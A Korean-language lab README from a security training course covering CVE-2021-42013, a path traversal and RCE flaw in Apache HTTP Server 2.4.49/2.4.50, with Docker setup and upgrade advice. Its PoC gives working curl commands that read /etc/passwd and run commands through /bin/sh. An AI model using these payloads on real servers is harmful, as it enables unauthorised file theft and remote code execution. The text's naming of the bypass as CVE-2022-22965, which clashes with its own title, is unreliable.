# Apache HTTP Server 2.4.50의 Path traversal과 파일 접근 취약점 (CVE-2021-42013)

> 화이트햇 스쿨 3기 - [32반 이규민] ([@karajann](https://github.com/dmrmam))

## 요약
Apache HTTP Server 2.4.49 및 2.4.50 버전에서 발견된 경로 탐색(Path Traversal) 및 원격 코드 실행(RCE) 취약점입니다. 이 취약점은 이전에 발견된 CVE-2021-41773의 불완전한 패치로 인해 발생하였으며, 공격자가 웹 루트 디렉토리 외부의 파일에 접근하거나, 특정 조건 하에서 원격으로 코드를 실행할 수 있게 합니다.​

## 환경설정
'''
docker compose build
docker compose up -d
'''
시작 된 후 localhost:8080 에서 Apache HTTP Server 'It works!' 페이지를 볼 수 있습니다.

## 설정 조건
- httpd.conf 파일에서 특정 디렉토리에 대해 Require all granted로 설정되어 있거나, Require 지시어가 누락된 경우
- mod_cgi 모듈이 활성화되어 있고, 해당 디렉토리에서 CGI 스크립트 실행이 허용된 경우

## PoC
이전에 CVE-2021-41773 에서 경로 정규화 처리를 제대로 하지 못하기 때문에 '%2e' ( URL 인코딩된 '.')을 활용한 Path traversal 우회가 가능했습니다.
- ex: http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

패치 이후에도 이 취약점은 완벽하지 않았고, CVE-2022-22965 에서는
더블 인코딩 ('.%%32%65' -> '.%%65' -> '.e')를 사용해 다시 우회가 가능합니다.

- '/icons/'는 실제로 존재해야 우회가 가능합니다

```
curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```

![](1.png)

서버에 CGI 또는 CGID 모듈이 켜져 있다면, 이 Path traversal을 통해 원격 코드 실행(RCE)이 가능해 임의의 명령을 실행할수 있습니다

```
curl -v --data "echo;id" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
```

![](2.png)

## 정리
이 취약점은 'CVSS: 9.8'점의 치명적인 취약점으로써 인증 없이도 파일 유출과 원격 코드 실행이 가능합니다.
해결방안으로는 Apache 서버를 '2.4.51'이상 버전으로 즉시 업그레이드를 하거나 필요하지 않은 경우
'mod_cgi'혹은 'mod_cgid'를 비활성화 시킴으로써 패치가 가능합니다.
